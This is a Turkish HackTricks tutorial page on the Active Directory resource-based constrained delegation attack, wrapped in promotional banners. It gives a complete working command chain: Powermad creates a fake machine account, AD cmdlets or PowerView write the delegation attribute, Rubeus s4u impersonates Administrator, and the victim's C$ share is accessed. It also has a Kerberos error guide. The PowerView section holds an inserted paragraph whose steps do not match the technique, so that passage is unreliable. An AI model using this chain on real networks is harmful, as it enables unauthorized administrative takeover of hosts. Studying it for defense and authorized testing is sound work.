# Kaynak Tabanlı Kısıtlanmış Delege Etme

<details>

<summary><strong>AWS hackleme becerilerinizi sıfırdan kahraman seviyesine getirin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## Kaynak Tabanlı Kısıtlanmış Delege Etmenin Temelleri

Bu, temel [Kısıtlanmış Delege Etme](constrained-delegation.md) ile benzerdir, ancak **bir nesneye herhangi bir kullanıcıyı bir hizmete taklit etme izni vermek** yerine, Kaynak Tabanlı Kısıtlanmış Delege Etme, **nesneye kimin herhangi bir kullanıcıyı taklit edebileceğini belirler**.

Bu durumda, kısıtlanmış nesnenin, herhangi bir başka kullanıcıyı kendisiyle ilgili taklit edebilecek kullanıcının adını içeren _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ adında bir özelliği olacaktır.

Bu Kısıtlanmış Delege Etme ile diğer delege etme türleri arasındaki önemli bir fark da, **bir makine hesabına yazma izinleri** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/vb_) olan herhangi bir kullanıcının _**msDS-AllowedToActOnBehalfOfOtherIdentity**_'yi ayarlayabilmesidir (Diğer Delege Etme türlerinde etki alanı yönetici ayrıcalıklarına ihtiyacınız vardı).

### Yeni Kavramlar

Kısıtlanmış Delege Etme'de, kullanıcının _userAccountControl_ değerinin içindeki **`TrustedToAuthForDelegation`** bayrağının bir **S4U2Self** gerçekleştirmek için gerektiği söylenmişti. Ancak bu tamamen doğru değildir.\
Gerçek şu ki, o değere sahip olmasanız bile, bir **hizmet** (SPN'ye sahip olan) olarak herhangi bir kullanıcıya karşı bir **S4U2Self** gerçekleştirebilirsiniz, ancak **`TrustedToAuthForDelegation`**'a sahipseniz, dönen TGS **İleriye Yönlendirilebilir** olacaktır ve bu bayrağa sahip değilseniz, dönen TGS **İleriye Yönlendirilemez** olacaktır.

Ancak, **S4U2Proxy**'de kullanılan **TGS** **İleriye Yönlendirilemez** ise, bir **temel Kısıtlanmış Delege Etme**'yi kötüye kullanmaya çalışmak **çalışmayacaktır**. Ancak, bir **Kaynak Tabanlı kısıtlanmış delege etmeyi** sömürmeye çalışıyorsanız, bu çalışacaktır (bu bir zayıflık değil, görünüşe göre bir özelliktir).

### Saldırı Yapısı

> Eğer bir **Bilgisayar** hesabına **yazma yetkisi eşdeğer ayrıcalıklarına** sahipseniz, o makinede **yetkili erişim** elde edebilirsiniz.

Saldırganın zaten **kurban bilgisayarında yazma yetkisi eşdeğer ayrıcalıklarına** sahip olduğunu varsayalım.

1. Saldırgan, bir **SPN'ye sahip olan bir hesabı** zaten **ele geçirir** veya bir tane oluşturur ("Hizmet A"). Herhangi bir _Yönetici Kullanıcısı_ herhangi bir özel ayrıcalığa sahip olmadan **10 adede kadar Bilgisayar nesnesi** oluşturabilir ve bunlara bir SPN atayabilir. Bu nedenle saldırgan sadece bir Bilgisayar nesnesi oluşturabilir ve bir SPN atayabilir.
2. Saldırgan, kurban bilgisayarında (Hizmet B) **YAZMA yetkisini kötüye kullanarak kaynak tabanlı kısıtlanmış delege etmeyi yapılandırır** ve Hizmet A'nın o kurban bilgisayarına karşı herhangi bir kullanıcıyı taklit etmesine izin verir.
3. Saldırgan, Rubeus'u kullanarak Hizmet A'dan Hizmet B'ye **tam bir S4U saldırısı** (S4U2Self ve S4U2Proxy) gerçekleştirir ve Hizmet B'ye **yetkili erişime sahip bir kullanıcı** için bir TGS talep eder.
1. S4U2Self (ele geçirilen/oluşturulan SPN hesabından): **Yönetici için bana bir TGS** isteği yapar (İleriye Yönlendirilemez).
2. S4U2Proxy: Önceki adımda kullanılan **İleriye Yönlendirilemez TGS**'yi kullanarak **Yönetici**'den **kurban ana bilgisayara** bir **TGS** talep eder.
3. İleriye Yönlendirilemez TGS kullansanız bile, kaynak tabanlı kısıtlanmış delege etmeyi sömürdüğünüz için çalışacaktır.
4. Saldırgan, **bilet aktarabilir** ve kullanıcıyı taklit ederek **kurban Hizmet B'ye erişim** elde edebilir.

Etki alanının _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Saldırı

### Bir Bilgisayar Nesnesi Oluşturma

[Powermad](https://github.com/Kevin-Robertson/Powermad) kullanarak etki alanı içinde bir bilgisayar nesnesi oluşturabilirsiniz:**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### R**esource-based Constrained Delegation'ı Yapılandırma**

**activedirectory PowerShell modülünü kullanarak**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview kullanarak**

Powerview, aktif dizin ortamında çalışan bir PowerShell betiğidir. Bu betik, aktif dizin ortamında kullanıcılar, gruplar, bilgisayarlar ve diğer nesneler hakkında bilgi toplamak ve manipüle etmek için kullanılır. Powerview, etkili bir şekilde aktif dizin ortamını keşfetmek ve saldırı vektörleri oluşturmak için kullanılabilir.

Powerview'ı kullanarak, kaynak tabanlı sınırlı yetkilendirme (resource-based constrained delegation) gibi bir saldırı tekniğini gerçekleştirebilirsiniz. Bu teknik, bir hedef kullanıcının kimlik bilgilerini ele geçirerek, başka bir kullanıcının kimliğiyle hedef sunuculara erişim sağlamayı mümkün kılar.

Bu saldırı tekniğini gerçekleştirmek için aşağıdaki adımları izleyebilirsiniz:

1. Powerview'ı hedef sunucuya yükleyin.
2. Powerview'ı çalıştırarak aktif dizin ortamını keşfedin.
3. Hedef kullanıcının kimlik bilgilerini ele geçirin.
4. Hedef sunucuda kaynak tabanlı sınırlı yetkilendirme yapılandırması kontrol edin.
5. Hedef sunucuda kaynak tabanlı sınırlı yetkilendirme yapılandırması varsa, hedef kullanıcının kimlik bilgilerini kullanarak başka bir kullanıcının kimliğiyle hedef sunucuya erişim sağlayın.

Bu saldırı tekniği, hedef sunucuda kaynak tabanlı sınırlı yetkilendirme yapılandırması olduğunda etkili olabilir. Ancak, bu teknik yalnızca yasal izinlerle ve etik kurallara uygun olarak kullanılmalıdır.
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Tam bir S4U saldırısı gerçekleştirme

İlk olarak, `123456` şifresiyle yeni bir Bilgisayar nesnesi oluşturduk, bu yüzden o şifrenin hash değerine ihtiyacımız var:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Bu, hesap için RC4 ve AES karmaşalarını yazdıracaktır.\
Şimdi, saldırı gerçekleştirilebilir:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus'un `/altservice` parametresini kullanarak sadece bir kez isteyerek daha fazla bilet oluşturabilirsiniz:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Not edin ki kullanıcıların "**Delege edilemez**" adında bir özelliği vardır. Bir kullanıcının bu özelliği True olarak ayarlanmışsa, onun yerine geçemezsiniz. Bu özellik bloodhound içinde görülebilir.
{% endhint %}

### Erişim

Son komut satırı, **tam S4U saldırısını gerçekleştirecek ve TGS'yi** Administrator'dan hedef ana bilgisayara **belleğe enjekte edecektir**.\
Bu örnekte Administrator'dan **CIFS** hizmeti için bir TGS talep edildi, bu yüzden **C$'ye** erişebileceksiniz:
```bash
ls \\victim.domain.local\C$
```
### Farklı hizmet biletlerini kötüye kullanma

[**Burada mevcut hizmet biletlerini öğrenin**](silver-ticket.md#available-services).

## Kerberos Hataları

* **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, kerberos'un DES veya RC4 kullanmaması şeklinde yapılandırıldığı ve sadece RC4 karma değerini sağladığınız anlamına gelir. Rubeus'a en azından AES256 karma değerini sağlayın (veya sadece rc4, aes128 ve aes256 karma değerlerini sağlayın). Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın saati ile DC'nin saati farklı olduğunda ve kerberos'un düzgün çalışmadığı anlamına gelir.
* **`preauth_failed`**: Bu, verilen kullanıcı adı + karma değerlerinin oturum açmak için çalışmadığı anlamına gelir. Karma değerlerini oluştururken kullanıcı adının içine "$" koymayı unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Bu şunları ifade edebilir:
* Taklit etmeye çalıştığınız kullanıcının istenen hizmete erişimi olmayabilir (çünkü taklit edemezsiniz veya yeterli ayrıcalığa sahip değildir)
* İstenen hizmet mevcut değil (örneğin winrm için bir bilet isterseniz ancak winrm çalışmıyorsa)
* Oluşturulan sahte bilgisayar, zayıf hedef sunucu üzerindeki ayrıcalıklarını kaybetmiş olabilir ve onları geri vermeniz gerekebilir.

## Referanslar

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı yapmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden oluşan PEASS Ailesi**](https://opensea.io/collection/the-peass-family)'ni keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da takip edin 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live).
* Hacking hilelerinizi paylaşarak **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek katkıda bulunun.

</details>
